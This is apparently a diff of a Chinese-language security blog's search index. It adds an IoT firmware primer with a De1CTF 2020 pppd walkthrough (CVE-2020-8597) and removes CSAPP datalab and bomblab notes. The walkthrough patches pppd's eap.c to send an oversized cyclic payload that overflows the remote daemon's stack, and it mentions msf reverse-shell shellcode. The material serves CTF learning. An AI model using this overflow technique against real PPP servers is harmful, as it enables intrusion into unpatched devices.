length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; job 0x3847d864df19(这个地址根据第九行那里显示地址)</span><br><span class="line">0x3847d864df19: [JSArray]</span><br><span class="line"> - map: 0x27aca0f42d99 &lt;Map(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x33ab2b711111 &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; [PACKED_SMI_ELEMENTS (COW)]</span><br><span class="line"> - length: 3</span><br><span class="line"> - properties: 0x27d6f1300c71 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x1f78960401a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3847d864de39 &lt;FixedArray[3]&gt; &#123;</span><br><span class="line">           0: 1</span><br><span class="line">           1: 2</span><br><span class="line">           2: 3</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+
+<p>v8的gdb也可以了</p>
+<h3 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tools&#x2F;dev&#x2F;gm.py x64.debug d8</span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>v8</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>winter</title>
+    <url>/2020/07/23/winter/</url>
+    <content><![CDATA[<p>who am i</p>
+<p>hexo主题：<a href="https://hexo.io/themes/" target="_blank" rel="noopener">https://hexo.io/themes/</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>固件iot基础</title>
+    <url>/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/</url>
+    <content><![CDATA[<p>IOT 安全实战资料收集整合：<a href="https://zybuluo.com/H4l0/note/1524758" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1524758</a></p>
+<h3 id="一、固件安全概述"><a href="#一、固件安全概述" class="headerlink" title="一、固件安全概述"></a>一、固件安全概述</h3><p>​    固件指设备内部保存的<strong>设备 “驱动程序”</strong>，通过固件，操作系统才能按照标准的设备驱动实现特定机器的运行动作。固件是担任着一个系统最基础最底层工作的软件。</p>
+<p>​    在硬件设备中，固件就是硬件设备的灵魂，因为一些硬件设备除了固件以外没有其它软件组成，因此固件也就决定着硬件设备的功能及性能。</p>
+<h4 id="固件结构特点"><a href="#固件结构特点" class="headerlink" title="固件结构特点"></a>固件结构特点</h4><p>iot 设备固件一般由 bootloader、kernel、rootfs 几部分组成。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829170912807.png" alt="image-20200829170912807"></p>
+<h3 id="二、固件模拟概述"><a href="#二、固件模拟概述" class="headerlink" title="二、固件模拟概述"></a>二、固件模拟概述</h3><p>iot 设备固件属于嵌入式固件的一种，无法直接运行在 x86 架构上。<br>需要借助一些模拟器来进行模拟，一般选择 qemu 模拟器。</p>
+<h4 id="vmware-和-qemu-的区别"><a href="#vmware-和-qemu-的区别" class="headerlink" title="vmware 和 qemu 的区别"></a>vmware 和 qemu 的区别</h4><p>vmware 和 qemu都是虚拟机软件，他们的区别如下：</p>
+<ul>
+<li>vmware 目前只能模拟 x86 和 x64 架构，也就是是或不能模拟其他指令集，所以通常用来运行 ubuntu 系统，安装开发环境来进行交叉编译开发ARM软件。</li>
+<li>qemu 则能够在PC系统中模拟其他指令集的处理器，比如直接模拟Arm架构的处理器，当然也可以模拟 x86 和 x64 架构。</li>
+</ul>
+<p>使用：</p>
+<ul>
+<li>通常在PC平台安装 vmware 虚拟机软件，运行 ubuntu，编写和编译arm架构软件，然后在目标开发板运行。</li>
+<li>qemu 可以认为是在没有Arm开发板的情况下来模拟一个Arm开发板，运行 ubuntu 中开发的软件进行验证。</li>
+</ul>
+<h4 id="qemu-固件模拟"><a href="#qemu-固件模拟" class="headerlink" title="qemu 固件模拟"></a>qemu 固件模拟</h4><p>有两种运行方式：</p>
+<ul>
+<li>用户模式（user mode）：qemu 可以在当前CPU上执行被编译为支持其他CPU的程序（例如：qemu 可以在 x86 机器上执行一个ARM二进制可执行程序）。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~$ qemu-arm -L .&#x2F; .&#x2F;.&#x2F;usr&#x2F;bin&#x2F;tddp</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174231769.png" alt="image-20200829174231769"></p>
+<ul>
+<li>系统模式（system mode）：qemu 能模拟整个电脑系统，包括中央处理器及其他周边设备。</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;squashfs-root# chroot . sh</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829174236510.png" alt="image-20200829174236510"></p>
+<h3 id="三、MISP-PWN-amp-ARM-PWN"><a href="#三、MISP-PWN-amp-ARM-PWN" class="headerlink" title="三、MISP PWN &amp; ARM PWN"></a>三、MISP PWN &amp; ARM PWN</h3><h4 id="1）ctf-中的-mips-pwn"><a href="#1）ctf-中的-mips-pwn" class="headerlink" title="1）ctf 中的 mips pwn"></a>1）ctf 中的 mips pwn</h4><h5 id="（a）2020-De1ctf-pppd-（CVE-2020-8597）"><a href="#（a）2020-De1ctf-pppd-（CVE-2020-8597）" class="headerlink" title="（a）2020 De1ctf - pppd （CVE-2020-8597）"></a>（a）2020 De1ctf - pppd （CVE-2020-8597）</h5><p>考点：</p>
+<ol>
+<li>nday cve 漏洞分析和利用；</li>
+<li>mips 指令集栈溢出漏洞的调试和利用</li>
+</ol>
+<p>文件：<code>vmlinux</code>、<code>rootfs.img</code>、<code>qemu</code>的启动脚本<code>start.sh</code>。</p>
+<p>漏洞点：</p>
+<p>在 <a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#0" target="_blank" rel="noopener">eap_request</a>和<a href="https://github.com/paulusmack/ppp/blob/ppp-2.4.7/pppd/eap.c#L1719" target="_blank" rel="noopener">eap_response</a>函数中，<code>rhostname</code>是在栈中分配的256字节长的缓冲区。在<code>EAPT_MD5CHAP</code>分支中，由于<a href="https://github.com/paulusmack/ppp/commit/8d7970b8f3db727fe798b65f3377fe6787575426" target="_blank" rel="noopener">不正确的大小检查</a>，主机名大于256个字节长将被允许被复制到<code>rhostname</code>，从而导致堆栈溢出。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121124694.png" alt="image-20200830121124694"></p>
+<p>操作步骤：</p>
+<p>（1）用<code>cpio</code>解包<code>rootfs.img</code> 。</p>
+<p>在chall目录下创建rootfs文件夹：<code>mkdir rootfs</code></p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830121439048.png" alt="image-20200830121439048"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ cpio -idvm &lt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>（2）编辑<code>etc/inittab</code></p>
+<p>找到对应相同的注释，把下面的覆盖过去即可。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Put a getty on the serial port</span><br><span class="line">#ttyS0::respawn:&#x2F;sbin&#x2F;getty -L  ttyS0 0 vt100 # GENERIC_SERIAL</span><br><span class="line">#ttyS0::sysinit:&#x2F;pppd auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"># Bring up network device</span><br><span class="line">::sysinit:&#x2F;sbin&#x2F;ifup -a</span><br><span class="line"># Launch gdbserver</span><br><span class="line">ttyS0::sysinit:&#x2F;gdbserver :1234 &#x2F;pppd &#x2F;dev&#x2F;ttyS1 auth local lock defaultroute nodetach 172.16.1.1:172.16.1.2 ms-dns 8.8.8.8 require-eap lcp-max-configure 100</span><br><span class="line"></span><br><span class="line"># Stuff to do for the 3-finger salute</span><br></pre></td></tr></table></figure>
+
+<p>（3）修改<code>start.sh</code>文件</p>
+<p>将最后面<code>-net null...</code>选项修改为<code>-net user,hostfwd=tcp::1234-:1234 -net nic -serial stdio -serial pty</code></p>
+<p>（4）将gdbserver放到环境的根目录<code>rootfs/</code>下</p>
+<p>（5）重新打包<code>rootfs.img</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ cd rootfs</span><br><span class="line">$ find . | cpio -H newc -o &gt; ..&#x2F;rootfs.img</span><br></pre></td></tr></table></figure>
+
+<p>（6）运行</p>
+<p><code>./start.sh</code></p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830122145171.png" alt="image-20200830122145171"></p>
+<p>打开一个新的窗口，使用<code>gdb</code>启动并连接远程<code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;hws_zongjie&#x2F;pppd&#x2F;attachment&#x2F;docker&#x2F;chall$ gdb-multiarch -ex &#39;set architecture mips&#39;   \</span><br><span class="line">               -ex &#39;target remote :1234&#39;     \</span><br><span class="line">               -ex &#39;file rootfs&#x2F;pppd&#39;        \</span><br><span class="line">               -ex &#39;break *0x42F9A8&#39;         \</span><br><span class="line">               -ex &#39;continue&#39;</span><br></pre></td></tr></table></figure>
+
+<p>再打开一个新的窗口</p>
+<p>编写一个1024字节长的循环字符串<code>/tmp/sc</code>作为payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python -c &#39;from pwn import*; open(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;wb&quot;).write(cyclic(1024))&#39;</span><br><span class="line">$ cat &#x2F;tmp&#x2F;sc</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak</span><br></pre></td></tr></table></figure>
+
+<p>接着</p>
+<p>（1）下载ppp的源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;paulusmack&#x2F;ppp.git</span><br><span class="line">cd ppp</span><br><span class="line">cd pppd</span><br></pre></td></tr></table></figure>
+
+<p>（2）修改<code>eap.c</code>，搜索<code>eap_chap_response</code>，找到</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eap_chap_response(esp, id, hash, esp-&gt;es_client.ea_name,</span><br><span class="line">		    esp-&gt;es_client.ea_namelen);</span><br></pre></td></tr></table></figure>
+
+<p>修改为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">char payload[1024] &#x3D; &#123;0&#125;;</span><br><span class="line">FILE *fp &#x3D; fopen(&quot;&#x2F;tmp&#x2F;sc&quot;, &quot;r&quot;);</span><br><span class="line">fread(payload, 1, 1024, fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">eap_chap_response(esp, id, hash, payload, 1024);</span><br></pre></td></tr></table></figure>
+
+<p>（3）编译</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line">pppd$ make </span><br><span class="line">$ cd pppd</span><br><span class="line">$ cp pppd pppd-payload</span><br></pre></td></tr></table></figure>
+
+<p>（4）在本地机器运行patched <code>pppd</code></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo .&#x2F;pppd-payload noauth local defaultroute debug nodetach &#x2F;dev&#x2F;pts&#x2F;1 user admin password 1234568</span><br></pre></td></tr></table></figure>
+
+<p>不久，远程<code>pppd</code>崩溃并出现分段错误。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830154226602.png" alt="image-20200830154226602"></p>
+<p>获取flag：</p>
+<p>方法一：</p>
+<p>执行<code>./exp.sh</code>，wireshark单独捕捉流量，然后直接搜flag</p>
+<p>方法二：</p>
+<p>msf生成 shellcode，然后用gen_payload.py脚本去生成payload就行了</p>
+<p>不过由于这是本地模拟，方法一可能抓不到，方法二反弹shellcode好像也有点问题，但是会回连端口。</p>
+<p>参考：</p>
+<p><a href="https://www.anquanke.com/post/id/200639" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200639</a></p>
+<p><a href="https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd" target="_blank" rel="noopener">https://github.com/xf1les/ctf-writeups/tree/master/De1taCTF_2020/pppd</a></p>
+<p><a href="https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2020/blob/master/writeup/pwn/pppd/README_zh.md</a></p>
+<h5 id="（b）2019-0ctf-embeded-heap"><a href="#（b）2019-0ctf-embeded-heap" class="headerlink" title="（b）2019 0ctf - embeded_heap"></a>（b）2019 0ctf - embeded_heap</h5><p>参考：</p>
+<p><a href="https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/" target="_blank" rel="noopener">https://e3pem.github.io/2019/08/26/0ctf-2019/embedded_heap/</a></p>
+<p><a href="https://zybuluo.com/H4l0/note/1633971" target="_blank" rel="noopener">https://zybuluo.com/H4l0/note/1633971</a></p>
+<p>考点：</p>
+<ol>
+<li>mips 堆溢出利用；</li>
+<li>uClibc 堆管理机制。 </li>
+</ol>
+<h4 id="2）ctf-中的-arm-pwn"><a href="#2）ctf-中的-arm-pwn" class="headerlink" title="2）ctf 中的 arm pwn"></a>2）ctf 中的 arm pwn</h4><h3 id="四、固件中常见安全漏洞"><a href="#四、固件中常见安全漏洞" class="headerlink" title="四、固件中常见安全漏洞"></a>四、固件中常见安全漏洞</h3><h4 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h4><p>栈溢出是在IOT设备固件中非常常见的一类的漏洞，当溢出的长度足以控制栈上的返回地址时，很容易造成任意代码执行的风险。</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200830015127901.png" alt="image-20200830015127901"></p>
+<p>DLINK DIR-815 路由器前台栈溢出</p>
+<h4 id="命令执行-命令注入"><a href="#命令执行-命令注入" class="headerlink" title="命令执行 / 命令注入"></a>命令执行 / 命令注入</h4><p>命令注入在IOT设备固件同样非常普遍，且利用简单，注入点通常运行的服务都是root权限。</p>
+<ul>
+<li>DLINK DIR-859 upnp 协议命令注入</li>
+<li>tplink sr20 路由器命令注入</li>
+<li>Draytek Vigor2960 前台登录处栈溢出</li>
+</ul>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<h4 id="拒绝服务"><a href="#拒绝服务" class="headerlink" title="拒绝服务"></a>拒绝服务</h4><p>在 IOT 设备固件中，拒绝服务漏洞通常是由于程序自身代码逻辑的缺陷导致的一类漏洞，这类漏洞一般都是由于内存操作方面的操作不当，造成空指针异常或者非法地址引用等问题进而导致设备服务崩溃或者设备重启。</p>
+<h3 id="五、实战"><a href="#五、实战" class="headerlink" title="五、实战"></a>五、实战</h3><p>栈溢出</p>
+<p>TPLINK WR841n 路由器后台栈溢出</p>
+<p>漏洞成因：httpd 服务中 stringModify 函数没有对转移义后的字符串长度进行有效判断，导致最后的字符串复制到目标栈内存空间中，其长度超过当前栈空间的大小，发生栈溢出。</p>
+<p>命令注入</p>
+<p>TPLINK Sr20 路由器 tddp 协议命令注入漏洞</p>
+<p>漏洞成因：tddp 协议服务对用户的输入没有进行有效的过滤，导致用户可以构造恶意的数据包造成命令注入。</p>
+<hr>
+<h3 id="cpio的解包与打包："><a href="#cpio的解包与打包：" class="headerlink" title="cpio的解包与打包："></a>cpio的解包与打包：</h3><p>cpio -idvm &lt; <strong>../rootfs.img</strong><br>find . | cpio -H newc -o &gt; <strong>../initrd.cpio</strong></p>
+<h3 id="squashfs解包与打包："><a href="#squashfs解包与打包：" class="headerlink" title="squashfs解包与打包："></a>squashfs解包与打包：</h3><p>unsquashfs  openwrt.squashfs<br>mksquashfs squashfs-root-0 1.squashfs -comp xz</p>
+<h3 id="ext4"><a href="#ext4" class="headerlink" title="ext4"></a>ext4</h3><p>这种文件系统的打包与解包使用mount挂载</p>
+<p><img src="/2020/10/22/%E5%9B%BA%E4%BB%B6iot%E5%9F%BA%E7%A1%80/image-20200829204006754.png" alt="image-20200829204006754"></p>
+<p>可以把cpio,squashfs,ext4理解成一个压缩包，都可以用<strong>binwalk解包</strong>，但是打包的方式是不同的</p>
+<p>这些东西其实就是文件系统，不仅仅保存文件内容，还保存这文件的元数据（名字，修改时间，作者啥啥的）</p>
+]]></content>
+      <tags>
+        <tag>iot</tag>
       </tags>
   </entry>
   <entry>
@@ -358,565 +917,6 @@
       </categories>
       <tags>
         <tag>v8</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>datalab</title>
-    <url>/2020/07/23/datalab/</url>
-    <content><![CDATA[<h4 id="1-bitXor"><a href="#1-bitXor" class="headerlink" title="1.bitXor"></a>1.bitXor</h4><p>用～（取补）和&amp;实现异或操作</p>
-<p><img src="/2020/07/23/datalab/image-20200720182358141.png" alt="image-20200720182358141"></p>
-<h4 id="2-tmin"><a href="#2-tmin" class="headerlink" title="2.tmin"></a>2.tmin</h4><p>两字节补码的最小数</p>
-<p>0111 1111 1111 1111 1111 1111 1111 1111 最大的，～x + 1，取负，负数比正数小一个</p>
-<p>1000 0000 0000 0000 0000 0000 0000 0000 == 0x80000000 </p>
-<p>太大了，用移位</p>
-<h4 id="3-isTmax"><a href="#3-isTmax" class="headerlink" title="3.isTmax"></a>3.isTmax</h4><p>如果x是最大值，返回1，否则返回0</p>
-<ul>
-<li>最大值，符号位是0，其他是1，所以+1后，符号位是1，其他是0，相异或，全1,全1的反是0，0取非是1（判断是否是-1的方法）</li>
-<li>除了最大值，-1也有同样的情况</li>
-</ul>
-<p>排除：+1后，最大值是变成另一个数，而-1是0，根据这个排除掉-1</p>
-<h4 id="4-allOddBits"><a href="#4-allOddBits" class="headerlink" title="4.allOddBits"></a>4.allOddBits</h4><p>如果奇数位都是1，返回1，否则，返回0</p>
-<p>让x与0xAAAAAAAA相与，如果奇数位都是1，结果是0xAAAAAAAA，再异或就是0了，否则就非0</p>
-<h4 id="5-negate"><a href="#5-negate" class="headerlink" title="5.negate"></a>5.negate</h4><p>实现取反</p>
-<p>-x = ~x + 1</p>
-<h4 id="6-isAsciiDigit"><a href="#6-isAsciiDigit" class="headerlink" title="6.isAsciiDigit"></a>6.isAsciiDigit</h4><p>如果 0x30 &lt;= x &lt;= 0x39 ，返回1，否则，返回0</p>
-<p>将x与两数相减（x - y ==  x + （～y + 1） ），判断符号位（通过右移），第一个为正，第二个为负</p>
-<h4 id="7-conditional"><a href="#7-conditional" class="headerlink" title="7.conditional"></a>7.conditional</h4><p>有三个参数，x、y、z，如果x非0，返回y，否则，返回z</p>
-<p>判断x是否非零：!!x</p>
-<p>返回一个数：变成1，然后～x + 1变成-1（全1），然后相与</p>
-<h4 id="8-isLessOrEqual"><a href="#8-isLessOrEqual" class="headerlink" title="8.isLessOrEqual"></a>8.isLessOrEqual</h4><p>三种情况</p>
-<ul>
-<li>符号相反，如果y为正数，为1</li>
-<li>符号相同，相减 &gt; 0为1</li>
-<li>两数相等（异或实现），返回1</li>
-</ul>
-<h4 id="9-logicalNeg"><a href="#9-logicalNeg" class="headerlink" title="9.logicalNeg"></a>9.logicalNeg</h4><p>实现取非运算，零返回1，其他返回0</p>
-<p>正负零的符号位都是0</p>
-<p>取反与1&amp;，正负再&amp;</p>
-<h4 id="10-howManyBits"><a href="#10-howManyBits" class="headerlink" title="10.howManyBits"></a>10.howManyBits</h4><p>求共有多少位，最高位+1</p>
-<p>特殊情况</p>
-<ul>
-<li>0 : 1</li>
-<li>1 : 1</li>
-</ul>
-<p>正数：最高位1的位置 + 1（符号位）</p>
-<p>负数：求反码，同正数</p>
-<p>具体采用二分，32分成16，看高位16是否为0，非0，说明至少有16 + 1（前面的数）+ 1 （符号位），接着再8、4、2、1下去</p>
-<h4 id="11-floatScale2"><a href="#11-floatScale2" class="headerlink" title="11.floatScale2"></a>11.floatScale2</h4><p>实现乘2功能。（内部使用的单精度浮点型）</p>
-<p>特殊情况</p>
-<ul>
-<li>NaN：直接将参数返回回去</li>
-<li>区别规格化数和非规格化数</li>
-</ul>
-<p>单精度浮点内部</p>
-<p><img src="/2020/07/23/datalab/image-20200720214424119.png" alt="image-20200720214424119"></p>
-<p>NaN</p>
-<p><img src="/2020/07/23/datalab/image-20200720214532080.png" alt="image-20200720214532080"></p>
-<p>正负无穷</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C11.png" alt="11"></p>
-<h4 id="12-floatFloat2Int"><a href="#12-floatFloat2Int" class="headerlink" title="12.floatFloat2Int"></a>12.floatFloat2Int</h4><p>参数的类型是unsigned，是浮点数的机器数，将其转换为该浮点数转换的int值。</p>
-<p>情况：</p>
-<ul>
-<li><p>指数部分为为负，说明一定是零点几，直接返0</p>
-</li>
-<li><p>如果大于31，大了，直接返回0x80000000u</p>
-</li>
-<li><p>在里面，先让尾数部分加上默认的1，然后看指数是否能把所有的尾数变整</p>
-<ul>
-<li>E &lt; 23，说明后面还有小数部分</li>
-<li>E &gt; 23，说明尾数都完整整数，还可以继续乘2^(E-23)</li>
-</ul>
-<p>最后，根据符号位，返回对应符号的frac</p>
-</li>
-</ul>
-<h4 id="13-floatPower2"><a href="#13-floatPower2" class="headerlink" title="13.floatPower2"></a>13.floatPower2</h4><p>2^x（x是参数），求该值float的机器数</p>
-<p>分别判断0和无穷大的情况，然后将阶码左移23位即可。</p>
-<p>23是因为，阶码部分，就是尾数（23位）前面，有个默认的1</p>
-<p>E = x;</p>
-<p>0 | bios + E | 23个0</p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.1.png" alt="13.1"></p>
-<p><img src="/2020/07/23/datalab/D:%5Cwinter-blog%5Csource_posts%5Cdatalab%5C13.2.png" alt="13.2"></p>
-<hr>
-<p><img src="/2020/07/23/datalab/image-20200720222037585.png" alt="image-20200720222037585"></p>
-]]></content>
-      <tags>
-        <tag>csapp</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>bomblab</title>
-    <url>/2020/07/24/bomblab/</url>
-    <content><![CDATA[<p>总共六个阶段</p>
-<p>任务是，运行时，有六个阶段，每个阶段输入一个字符串，如果输入错误，炸弹爆炸。这次给的文件不全，所以，需要看汇编了解程序。</p>
-<p>导出汇编代码：<code>unix&gt; objdump -d &gt; obj.txt</code></p>
-<h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#main这块关于第一阶段的代码</span><br><span class="line">400e32:	e8 67 06 00 00       	callq  40149e &lt;read_line&gt;</span><br><span class="line">400e37:	48 89 c7             	mov    %rax,%rdi						#读入的放入rdi</span><br><span class="line">400e3a:	e8 a1 00 00 00       	callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">400e3f:	e8 80 07 00 00       	callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">400e44:	bf a8 23 40 00       	mov    $0x4023a8,%edi</span><br><span class="line">400e49:	e8 c2 fc ff ff       	callq  400b10 &lt;puts@plt&gt;</span><br></pre></td></tr></table></figure>
-
-<p>读入字符串，字符串地址存放在<code>rdi</code>中，然后呼叫<code>phase_1</code>函数，phase_defused和put都是输出提示性字符串</p>
-<p>每个阶段这块代码类似，字符串在<code>rdi</code>中。不再累赘。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#phase_1函数</span><br><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400ee4:	be 00 24 40 00       	mov    $0x402400,%esi					#把0x402400放入esi</span><br><span class="line">  400ee9:	e8 4a 04 00 00       	callq  401338 &lt;strings_not_equal&gt;</span><br><span class="line">  400eee:	85 c0                	test   %eax,%eax						#执行and操作，如果两个相等，zf&#x3D;1</span><br><span class="line">  400ef0:	74 05                	je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:	e8 43 05 00 00       	callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  400efb:	c3                   	retq</span><br></pre></td></tr></table></figure>
-
-<p>将0x402400地址存入<code>esi</code>，然后调用<code>strings_not_equal</code>函数，对返回结果<code>eax</code>进行查看，等于0成功，否则，炸弹爆炸</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#strings_not_equal函数</span><br><span class="line">0000000000401338 &lt;strings_not_equal&gt;:										&#x2F;&#x2F;相等，返回0，不相等，返回1</span><br><span class="line">  401338:	41 54                	push   %r12</span><br><span class="line">  40133a:	55                   	push   %rbp</span><br><span class="line">  40133b:	53                   	push   %rbx</span><br><span class="line">  40133c:	48 89 fb             	mov    %rdi,%rbx						#读入的</span><br><span class="line">  40133f:	48 89 f5             	mov    %rsi,%rbp						#0x402400</span><br><span class="line">  401342:	e8 d4 ff ff ff       	callq  40131b &lt;string_length&gt;			#把字符串放入rdi</span><br><span class="line">  401347:	41 89 c4             	mov    %eax,%r12d         				#读入的长度放入r12d</span><br><span class="line">  40134a:	48 89 ef             	mov    %rbp,%rdi</span><br><span class="line">  40134d:	e8 c9 ff ff ff       	callq  40131b &lt;string_length&gt;</span><br><span class="line">  401352:	ba 01 00 00 00       	mov    $0x1,%edx				</span><br><span class="line">  401357:	41 39 c4             	cmp    %eax,%r12d						#0x402400的长度与读入的长度cmp</span><br><span class="line">  40135a:	75 3f                	jne    40139b &lt;strings_not_equal+0x63&gt;	#如果不相等，eax&#x3D;0x1,结束</span><br><span class="line">  </span><br><span class="line">																			#相等要返回长度，所以接下来要找到最前面0的位置(二分)</span><br><span class="line">  40135c:	0f b6 03             	movzbl (%rbx),%eax						#如果相等，eax&#x3D;读入地址里面的内容</span><br><span class="line">																			#movzbl指令负责拷贝一个字节，并用0填充其目的操作数中的其余各位，这种扩展方式叫“零扩展”。</span><br><span class="line">  40135f:	84 c0                	test   %al,%al							#如果al&#x3D;0，eax&#x3D;0，结束</span><br><span class="line">  401361:	74 25                	je     401388 &lt;strings_not_equal+0x50&gt;	#如果al！&#x3D;0</span><br><span class="line">  401363:	3a 45 00             	cmp    0x0(%rbp),%al					#第一个字节相比				</span><br><span class="line">  401366:	74 0a                	je     401372 &lt;strings_not_equal+0x3a&gt;	#相等，rbx、rbp+1</span><br><span class="line">  401368:	eb 25                	jmp    40138f &lt;strings_not_equal+0x57&gt;	#不相等，eax&#x3D;0x1，返回</span><br><span class="line">  40136a:	3a 45 00             	cmp    0x0(%rbp),%al					#继续比较下一个字节(rbp+1)</span><br><span class="line">  40136d:	0f 1f 00             	nopl   (%rax)							#nop 是什么都不做的意思（no-operation）。这里填入 nop 是为了让后面的函数对齐到 16 字节处</span><br><span class="line">  401370:	75 24                	jne    401396 &lt;strings_not_equal+0x5e&gt;	#后面的字节不相等，eax&#x3D;1，返回</span><br><span class="line">  401372:	48 83 c3 01          	add    $0x1,%rbx						#相等，继续加</span><br><span class="line">  401376:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  40137a:	0f b6 03             	movzbl (%rbx),%eax						#eax&#x3D;下一个地址里面的内容</span><br><span class="line">  40137d:	84 c0                	test   %al,%al							#继续比较al是否是0</span><br><span class="line">  40137f:	75 e9                	jne    40136a &lt;strings_not_equal+0x32&gt;	#不是，回去</span><br><span 